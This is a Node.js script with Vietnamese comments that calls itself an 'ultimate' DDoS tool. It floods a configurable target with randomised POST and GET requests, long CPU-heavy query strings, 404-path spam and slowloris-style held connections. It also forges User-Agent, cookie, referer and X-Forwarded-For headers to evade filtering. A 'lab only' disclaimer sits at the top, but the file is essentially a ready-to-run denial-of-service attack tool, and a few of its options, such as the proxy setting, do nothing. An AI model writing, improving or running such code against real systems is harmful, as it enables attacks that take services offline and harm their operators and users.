// server.js - DDoS TỐI THƯỢNG (Ultimate Edition)
// Chạy: node server.js
// ⚠️ Chỉ dùng trong môi trường Lab

const http = require('http');
const https = require('https');
const { Worker } = require('worker_threads');
const os = require('os');
const fs = require('fs');
const cluster = require('cluster');

// ===== CẤU HÌNH TỐI ƯU NHẤT =====
const CONFIG = {
    target: 'http://192.168.1.100:8080',     // ĐỔI THÀNH TARGET CỦA BẠN
    threads: os.cpus().length * 500,          // 500 luồng/core CPU (tối đa)
    requestsPerThread: 200000,                // Request mỗi luồng
    method: 'POST',                           // POST tốn resource hơn GET
    timeout: 200,                             // Timeout thấp nhất
    useProxy: false,                          
    attackMode: 'mixed',                      // DDoS + 404
    slowloris: true,                          // BẬT SLOWLORIS
    slowlorisDelay: 60000,                    // Giữ 60 giây
    verbose: true,
    keepAlive: false,                         // Tắt keep-alive để tiết kiệm memory
    attackEndpoints: [                        // Endpoint tấn công
        '/',
        '/api/search?q=' + 'a'.repeat(10000), // Query cực dài tốn CPU
        '/api/login',
        '/api/upload',
        '/api/report',
        '/search?q=' + 'a'.repeat(10000),
        '/product/search?q=' + 'a'.repeat(10000),
        '/wp-admin/admin-ajax.php',
        '/api/v1/data',
        '/api/v2/query'
    ],
    custom404Paths: [                         // Đường dẫn 404
        '/wp-admin/', '/api/v1/', '/css/', '/js/', '/images/', 
        '/assets/', '/vendor/', '/node_modules/', '/admin/', 
        '/login/', '/dashboard/', '/profile/', '/settings/', 
        '/upload/', '/download/', '/search/', '/product/', 
        '/cart/', '/checkout/', '/payment/', '/order/', 
        '/invoice/', '/report/', '/analytics/', '/log/', 
        '/backup/', '/temp/', '/tmp/', '/cache/', '/static/', 
        '/media/', '/files/', '/doc/', '/docs/', '/help/', 
        '/support/', '/contact/', '/about/', '/blog/', '/news/', 
        '/events/', '/gallery/', '/portfolio/', '/services/', 
        '/pricing/', '/faq/', '/terms/', '/privacy/', '/sitemap/',
        '/.env', '/.git/', '/.htaccess', '/phpinfo.php', 
        '/test.php', '/info.php', '/config.php', '/db.php',
        '/backup.sql', '/dump.sql', '/log.txt', '/error.log'
    ],
    // Dùng để tấn công đa dạng
    randomQuery: true,                        // Random query params
    randomPath: true,                         // Random path
    useCookie: true,                          // Dùng cookie giả
    useReferer: true,                         // Dùng referer giả
    useXForwardedFor: true                    // Dùng IP giả
};

// ===== USER-AGENT POOL ĐA DẠNG =====
const UAS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/121.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/122.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.2 Safari/605.1.15',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) Version/17.2 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (Android 14; Mobile; rv:109.0) Gecko/20100101 Firefox/122.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Edge/121.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) Chrome/121.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Chrome/121.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/122.0'
];

// ===== COOKIE POOL =====
const COOKIES = [
    'session=' + Math.random().toString(36).substring(2, 15),
    'token=' + Math.random().toString(36).substring(2, 20),
    'user=' + Math.random().toString(36).substring(2, 10),
    'sid=' + Math.random().toString(36).substring(2, 12),
    'PHPSESSID=' + Math.random().toString(36).substring(2, 16),
    'JSESSIONID=' + Math.random().toString(36).substring(2, 14)
];

// ===== LOAD PROXY (nếu có) =====
function loadProxies() {
    try {
        if (fs.existsSync('proxies.txt')) {
            const data = fs.readFileSync('proxies.txt', 'utf8');
            return data.split('\n').filter(line => line.trim());
        }
        return [];
    } catch (e) {
        return [];
    }
}
const proxies = loadProxies();

// ===== TẠO HEADERS GIẢ =====
function createHeaders() {
    const headers = {
        'User-Agent': UAS[Math.floor(Math.random() * UAS.length)],
        'Cache-Control': 'no-cache, no-store, must-revalidate',
        'Pragma': 'no-cache',
        'Expires': '0',
        'Accept': '*/*',
        'Accept-Encoding': 'gzip, deflate, br',
        'Accept-Language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'Connection': CONFIG.slowloris ? 'keep-alive' : 'close',
        'Upgrade-Insecure-Requests': '1'
    };
    
    if (CONFIG.useCookie) {
        headers['Cookie'] = COOKIES[Math.floor(Math.random() * COOKIES.length)];
    }
    
    if (CONFIG.useReferer) {
        const refs = ['https://google.com/', 'https://facebook.com/', 'https://youtube.com/', 'https://twitter.com/'];
        headers['Referer'] = refs[Math.floor(Math.random() * refs.length)];
    }
    
    if (CONFIG.useXForwardedFor) {
        headers['X-Forwarded-For'] = Math.floor(Math.random() * 255) + '.' + 
                                     Math.floor(Math.random() * 255) + '.' + 
                                     Math.floor(Math.random() * 255) + '.' + 
                                     Math.floor(Math.random() * 255);
        headers['X-Real-IP'] = headers['X-Forwarded-For'];
    }
    
    return headers;
}

// ===== TẠO REQUEST TỐI ƯU =====
function createRequest() {
    let endpoint = '';
    let method = CONFIG.method;
    
    // Random endpoint
    if (CONFIG.attackMode === '404' || CONFIG.attackMode === 'mixed') {
        if (Math.random() > 0.3 || CONFIG.attackMode === '404') {
            const base = CONFIG.custom404Paths[Math.floor(Math.random() * CONFIG.custom404Paths.length)];
            const random = Math.random().toString(36).substring(2, 10);
            endpoint = base + '/' + random;
            // Thêm query params
            endpoint += '?id=' + Math.random().toString(36).substring(2, 10);
            endpoint += '&t=' + Date.now();
            endpoint += '&r=' + Math.random().toString(36).substring(2, 8);
            endpoint += '&q=' + 'a'.repeat(Math.floor(Math.random() * 500));
        } else {
            endpoint = CONFIG.attackEndpoints[Math.floor(Math.random() * CONFIG.attackEndpoints.length)];
        }
    } else {
        endpoint = CONFIG.attackEndpoints[Math.floor(Math.random() * CONFIG.attackEndpoints.length)];
    }
    
    // Thêm query random nếu bật
    if (CONFIG.randomQuery && !endpoint.includes('?')) {
        endpoint += '?r=' + Math.random().toString(36).substring(2, 8);
        endpoint += '&t=' + Date.now();
    }
    
    const url = CONFIG.target + endpoint;
    const headers = createHeaders();
    const options = {
        method: method,
        headers: headers,
        timeout: CONFIG.timeout,
        agent: false // Tạo agent mới mỗi request để tránh giới hạn connection
    };

    if (method === 'POST') {
        options.headers['Content-Type'] = 'application/x-www-form-urlencoded';
        options.body = 'data=' + Math.random().toString(36).substring(2, 15) + 
                       '&t=' + Date.now() + 
                       '&q=' + 'a'.repeat(Math.floor(Math.random() * 10000));
    }

    return { options, url };
}

// ===== GỬI REQUEST =====
function sendRequest() {
    return new Promise((resolve) => {
        const { options, url } = createRequest();
        const client = url.startsWith('https') ? https : http;
        const req = client.request(url, options, (res) => {
            res.resume();
            if (CONFIG.slowloris) {
                setTimeout(() => {
                    res.destroy();
                    resolve();
                }, CONFIG.slowlorisDelay + Math.random() * 1000);
            } else {
                resolve();
            }
        });

        req.on('error', () => resolve());
        req.on('timeout', () => { req.destroy(); resolve(); });

        if (options.body) {
            req.write(options.body);
        }
        req.end();
    });
}

// ===== CHẠY TẤN CÔNG VỚI MULTI-THREAD =====
console.log('🔥 DDoS PRO - ULTIMATE EDITION');
console.log('📌 Target:', CONFIG.target);
console.log('🧵 Threads:', CONFIG.threads);
console.log('📤 Requests/thread:', CONFIG.requestsPerThread);
console.log('📊 Total requests:', CONFIG.threads * CONFIG.requestsPerThread);
console.log('🎯 Mode:', CONFIG.attackMode);
console.log('🐌 Slowloris:', CONFIG.slowloris ? 'ON (' + CONFIG.slowlorisDelay + 'ms)' : 'OFF');
console.log('📡 Proxy:', CONFIG.useProxy ? 'ON (' + proxies.length + ' proxies)' : 'OFF');
console.log('📦 Method:', CONFIG.method);
console.log('---------------------------');

const startTime = Date.now();
let totalSent = 0;
let completedThreads = 0;

// Tối ưu: Sử dụng setInterval để gửi nhanh hơn
for (let i = 0; i < CONFIG.threads; i++) {
    setTimeout(() => {
        let count = 0;
        const interval = setInterval(async () => {
            if (count >= CONFIG.requestsPerThread) {
                clearInterval(interval);
                completedThreads++;
                if (completedThreads === CONFIG.threads) {
                    const endTime = Date.now();
                    const duration = ((endTime - startTime) / 1000).toFixed(2);
                    console.log('---------------------------');
                    console.log('✅ DONE!');
                    console.log('📊 Total requests:', totalSent);
                    console.log('⏱️ Duration:', duration + 's');
                    console.log('⚡ RPS:', Math.round(totalSent / duration));
                    console.log('📈 Avg/thread:', Math.round(totalSent / CONFIG.threads));
                    process.exit(0);
                }
                return;
            }
            await sendRequest();
            count++;
            totalSent++;
            
            if (CONFIG.verbose && totalSent % 1000 === 0) {
                const elapsed = (Date.now() - startTime) / 1000;
                const rps = Math.round(totalSent / elapsed);
                const memory = process.memoryUsage();
                console.log(`📤 Sent ${totalSent} requests | ⚡ ${rps} RPS | 💾 ${Math.round(memory.rss / 1024 / 1024)}MB`);
            }
        }, 0); // Không delay
    }, i * 0.1); // Delay cực nhỏ để khởi tạo luồng
}

// Bắt lỗi và thoát an toàn
process.on('SIGINT', () => {
    console.log('\n⏹️ Stopped by user. Total:', totalSent);
    process.exit(0);
});

// Tăng giới hạn connection cho Node.js
require('events').EventEmitter.defaultMaxListeners = Infinity;
